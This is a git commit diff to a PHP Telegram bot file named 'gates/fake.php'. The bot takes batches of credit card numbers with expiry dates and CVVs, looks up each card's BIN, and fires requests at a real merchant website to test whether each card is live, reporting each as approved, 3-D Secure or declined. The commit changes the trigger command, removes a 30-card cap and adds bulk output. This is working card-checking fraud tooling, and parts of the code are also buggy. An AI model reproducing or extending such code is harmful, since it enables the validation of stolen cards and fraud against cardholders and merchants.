67aa9010cf5857a4547f8acaa8c52d4396bd39b8
Venkatesh Yadav <87112129+venkateshyadav13@users.noreply.github.com>
2024-05-14 14:13:06 +0530

    Update fake.php

--- gates/fake.php
+++ gates/fake.php
@@ -68,10 +68,14 @@ $update = json_decode(file_get_contents("php://input"), TRUE);
 $text = $update["message"]["text"];
 //========WHO CAN CHECK FUNC========//
 $r = "0";
-$gcm = "/gree";
+$gcm = "/ve";
 $r = rand(0, 100);
 //=====WHO CAN CHECK FUNC END======//
-if (preg_match('/^(\/gree|\.gree|!gree)/' == 0, $text)) {
+function makearray($message){
+    return explode("\n", $message);
+}
+
+if (preg_match('/^(\/ve|\.ve|!ve)/', $text)) {
     $userid = $update['message']['from']['id'];
 
     if (!checkAccess($userid)) {
@@ -79,44 +83,32 @@ if (preg_match('/^(\/gree|\.gree|!gree)/' == 0, $text)) {
         exit();
     }
 
+    $cclist = preg_replace("/[^0-9|\n]/", "",$message);
+    $array = explode("\n", $cclist);
+    $arraylen = count($array);
+    $new_array = [];
+    foreach ($array as $lista) {
 
 
-    
     $start_time = microtime(true);
 
     $chatId = $update["message"]["chat"]["id"];
     $message_id = $update["message"]["message_id"];
     $keyboard = "";
     $message = substr($message, 4);
-
-      $listas = explode("\n",$message);
-          $c = count($listas);
-          $c = $c - 1;
-    if($c>30)
-    {
-      sendMessage($chat_id,"NOT MORE THAN 30 CCS AT A TIME",$message_id);
-      exit();
-    }
-$message = send_reply($chat_id,$message_id,urlencode("
-𝗖𝗖𝗦 𝗙𝗢𝗨𝗡𝗗 $c
-"),$messageId);
-$messageidtoedit1 = json_decode($message, TRUE);
     $messageidtoedit1 = bot('sendmessage', [
         'chat_id' => $chat_id,
-        'text' => "<b> Wait □□□□□ 0%[🟥] </b>",
+        'text' => "<b>Processing... </b>",
         'parse_mode' => 'html',
         'reply_to_message_id' => $message_id
     ]);
-
-    while($c>0)
-    {
     $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');
-    $lista = $listas[$c];
+
     $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
     $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
     $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
     $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
-    $lista = "$cc|$mes|$ano|$cvv";
+    $amt = '1';
     if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
         bot('editMessageText', [
             'chat_id' => $chat_id,
@@ -127,13 +119,18 @@ $messageidtoedit1 = json_decode($message, TRUE);
         ]);
         return;
     };
-
-    if (strlen($mes) == 1) $mes = "0$mes";
-    if (strlen($ano) == 2) $ano = "20$ano";
+    if (strlen($ano) == '4') {
+        $an = substr($ano, 2);
+    } else {
+        $an = $ano;
+    }
+    $amount = $amt * 100;
     //------------Card info------------//
+    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';
   
-  $bin = substr($cc, 0, 6);
   $ch = curl_init();
+
+  $bin = substr($cc, 0, 6);
 
   curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -165,6 +162,7 @@ $messageidtoedit1 = json_decode($message, TRUE);
     $bininfo = "$type - $brand - $category";
     $url = "$url";
     $type = strtoupper($type);
+  
  //==================[BIN LOOK-UP-END]======================//
 
   bot('editMessageText', [
@@ -200,7 +198,6 @@ $messageidtoedit1 = json_decode($message, TRUE);
         return $str[0];
     }
  # -------------------- [1 REQ] -------------------#
-
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -406,7 +403,11 @@ $messageidtoedit1 = json_decode($message, TRUE);
   
     $end_time = microtime(true);
     $time = number_format($end_time - $start_time, 2);
+
     ////////--[Responses]--////////
+        $i = "Card Details💳: $res%0Result: $msg";
+        $new_array[] = $i;
+        sendMessage($chatId, "$new_array[0]%0A$new_array[1]%0A$new_array[2]%0A$new_array[3]%0A$new_array[4]%0A$new_array[5]%0A$new_array[6]%0A$new_array[7]%0A$new_array[8]%0A$new_array[9]%0A$new_array[10]%0A$new_array[11]%0A$new_array[12]%0A$new_array[13]%0A$new_array[14]%0A$new_array[15]%0A$new_array[16]%0A$new_array[17]%0A$new_array[18]%0A$new_array[19]%0A$new_array[20]%0A$new_array[21]%0A$new_array[22]%0A$new_array[23]%0A$new_array[24]%0A$new_array[25]%0A$new_array[26]%0A$new_array[27]%0A$new_array[28]%0A$new_array[29]%0A$new_array[30]%0A$new_array[31]%0A$new_array[32]%0A$new_array[33]%0A$new_array[34]%0A$new_array[35]%0A$new_array[36]%0A$new_array[37]%0A$new_array[38]%0A$new_array[39]%0A$new_array[40]%0A$new_array[41]%0A$new_array[42]%0A$new_array[43]%0A$new_array[44]%0A$new_array[45]%0A$new_array[46]%0A$new_array[47]%0A$new_array[48]%0A$new_array[49]%0A$new_array[50]%0A$new_array[51]%0A$new_array[52]%0A$new_array[53]%0A$new_array[54]%0A$new_array[55]%0A$new_array[56]%0A$new_array[57]%0A$new_array[58]%0A$new_array[59]%0A$new_array[60]%0A$new_array[61]%0A$new_array[62]%0A$new_array[63]%0A$new_array[64]%0A$new_array[65]%0A$new_array[66]%0A$new_array[67]%0A$new_array[68]%0A$new_array[69]%0A$new_array[70]%0A$new_array[71]%0A$new_array[72]%0A$new_array[73]%0A$new_array[74]%0A$new_array[75]%0A$new_array[76]%0A$new_array[77]%0A$new_array[78]%0A$new_array[79]%0A$new_array[80]%0A$new_array[81]%0A$new_array[82]%0A$new_array[83]%0A$new_array[84]%0A$new_array[85]%0A$new_array[86]%0A$new_array[87]%0A$new_array[88]%0A$new_array[89]%0A$new_array[90]%0A$new_array[91]%0A$new_array[92]%0A$new_array[93]%0A$new_array[94]%0A$new_array[95]%0A$new_array[96]%0A$new_array[97]%0A$new_array[98]%0A$new_array[99]%0A$new_array[100]%0A$new_array[101]%0A", $message_id);
 
       if (strpos($rx, '3d_secure')) {
       $msg = 'Succeeded ';
@@ -439,9 +440,9 @@ $messageidtoedit1 = json_decode($message, TRUE);
               $es = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌'; 
               $msg =  "$msg";
 
+
     }
-$c--;
-}
+
     bot('editMessageText', [
         'chat_id' => $chat_id,
         'message_id' => $messageidtoedit,
@@ -462,4 +463,5 @@ $botu
         'parse_mode' => 'html',
         'disable_web_page_preview' => 'true'
     ]);
+}
 }
